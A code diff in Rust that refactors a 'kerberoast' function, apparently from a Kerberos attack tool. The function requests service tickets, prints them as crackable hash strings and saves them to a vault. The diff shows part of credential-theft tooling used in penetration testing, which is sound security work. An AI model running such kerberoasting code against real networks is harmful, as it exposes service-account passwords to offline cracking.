@@ -20,14 +20,15 @@ pub fn kerberoast(
     etype: Option<i32>,
 ) -> Result<()> {
     let username = user.name.clone();
-    let (mut krb_cred_plain, cred_format, tgt) = get_user_tgt(
+    let tgt = get_user_tgt(
         user.clone(),
         in_vault,
         user_key,
         transporter,
-        cred_format,
         etype,
     )?;
+
+    let tickets = in_vault.dump()?;
 
     for service in services {
         match request_tgs(
@@ -48,14 +49,14 @@ pub fn kerberoast(
                     crack_format,
                 );
                 println!("{}", crack_str);
-                krb_cred_plain.push(tgs);
+                tickets.push(tgs);
             }
         }
     }
 
     if let Some(out_vault) = out_vault {
         info!("Save {} TGSs in {}", username, out_vault.id());
-        out_vault.save(krb_cred_plain.into(), cred_format)?;
+        out_vault.save_as(tickets, cred_format)?;
     }
     return Ok(());
 }
